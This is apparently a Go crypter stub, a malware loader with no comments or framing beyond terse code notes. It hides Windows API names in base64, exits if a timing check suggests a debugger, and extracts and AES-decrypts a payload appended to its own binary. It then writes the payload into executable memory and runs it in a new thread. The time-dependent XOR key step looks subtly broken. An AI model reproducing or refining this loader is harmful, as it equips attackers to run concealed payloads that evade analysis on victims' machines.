package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	PROCESS_ALL_ACCESS     = 0x1F0FFF
)

var (
	k32 = syscall.NewLazyDLL(d("a2VybmVsMzIuZGxs"))
	nt  = syscall.NewLazyDLL(d("bnRkbGwuZGxs"))

	pVA  = k32.NewProc(d("VmlydHVhbEFsbG9j"))
	pCT  = k32.NewProc(d("Q3JlYXRlVGhyZWFk"))
	pWSO = k32.NewProc(d("V2FpdEZvclNpbmdsZU9iamVjdA=="))
	pRMM = nt.NewProc(d("UnRsTW92ZU1lbW9yeQ=="))
	pVP  = k32.NewProc(d("VmlydHVhbFByb3RlY3Q="))
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

func main() {
	// Anti-debug timing check
	start := time.Now()
	time.Sleep(100 * time.Millisecond)
	if time.Since(start) < 50*time.Millisecond {
		os.Exit(0) // Debugger detected
	}

	// Read self
	self, err := os.ReadFile(os.Args[0])
	if err != nil {
		os.Exit(1)
	}

	// Find payload marker
	m1 := []byte{0x3C, 0x3C, 0x3C, 0x50, 0x41, 0x59, 0x4C, 0x4F, 0x41, 0x44, 0x5F, 0x53, 0x54, 0x41, 0x52, 0x54, 0x3E, 0x3E, 0x3E}
	m2 := []byte{0x3C, 0x3C, 0x3C, 0x4B, 0x45, 0x59, 0x3E, 0x3E, 0x3E}

	idx := bytes.Index(self, m1)
	if idx == -1 {
		os.Exit(1)
	}

	// Extract key and encrypted payload
	keyStart := idx + len(m1) + len(m2)
	key := self[keyStart : keyStart+32]
	encrypted := self[keyStart+32:]

	// Multi-layer XOR deobfuscation (matches Crypter's double XOR)
	xorKey := byte(time.Now().Unix() % 256)
	for i := range key {
		key[i] ^= 0x5A ^ xorKey // Double XOR decode
	}

	// Decrypt payload
	plaintext, err := dec(encrypted, key)
	if err != nil {
		os.Exit(1)
	}

	// Add jitter delay
	time.Sleep(time.Duration(100+len(plaintext)%1000) * time.Millisecond)

	// Execute in memory using PE injection
	exec(plaintext)
}

func dec(ct, key []byte) ([]byte, error) {
	blk, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(blk)
	if err != nil {
		return nil, err
	}

	ns := gcm.NonceSize()
	if len(ct) < ns {
		return nil, err
	}

	n, ct := ct[:ns], ct[ns:]
	pt, err := gcm.Open(nil, n, ct, nil)
	if err != nil {
		return nil, err
	}

	return pt, nil
}

func exec(payload []byte) {
	// Allocate RWX memory
	addr, _, _ := pVA.Call(
		0,
		uintptr(len(payload)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)

	if addr == 0 {
		os.Exit(1)
	}

	// Copy payload to memory
	pRMM.Call(
		addr,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(len(payload)),
	)

	// Create execution thread
	h, _, _ := pCT.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)

	// Wait for thread
	pWSO.Call(h, 0xFFFFFFFF)
}
